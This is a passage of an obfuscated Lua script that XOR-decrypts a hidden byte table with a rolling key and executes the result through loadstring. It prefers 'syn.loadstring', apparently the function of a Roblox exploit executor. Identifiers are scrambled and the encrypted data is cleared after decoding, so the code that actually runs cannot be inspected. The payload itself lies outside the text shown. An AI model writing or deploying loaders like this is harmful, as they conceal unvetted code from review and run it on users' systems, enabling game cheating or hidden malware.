    local _0xlI00IO01O10l0lO = {}
    local _0x1l1O10IO0O0I1II = 1

    local _bxor = (bit32 and bit32.bxor) or (bit and bit.bxor) or function(a, b)
        local p, c = 1, 0
        while a > 0 and b > 0 do
            local ra, rb = a % 2, b % 2
            if ra ~= rb then c = c + p end
            a, b, p = (a - ra) / 2, (b - rb) / 2, p * 2
        end
        if a > 0 then c = c + a * p end
        if b > 0 then c = c + b * p end
        return c
    end

    for _, _0xlIllOOO01OlO000 in ipairs(_0xIOllIlII01lI010) do
        for _, _0x001lIOO111l0100 in ipairs(_0xlIllOOO01OlO000) do
            _0xlI00IO01O10l0lO[_0x1l1O10IO0O0I1II] = string.char(_bxor(_0x001lIOO111l0100, _0x1IOl1OII1llII1O))
            _0x1IOl1OII1llII1O = (_0x1IOl1OII1llII1O * 31 + 17) % 256
            _0x1l1O10IO0O0I1II = _0x1l1O10IO0O0I1II + 1
        end
    end

    _0xIOllIlII01lI010 = nil

    local _0x001l10lOO0lI01l = (syn and syn.loadstring) or (loadstring) or (load)
    local runner = assert(_0x001l10lOO0lI01l(table.concat(_0xlI00IO01O10l0lO)))
    _0xlI00IO01O10l0lO = nil
    return runner()
end)()
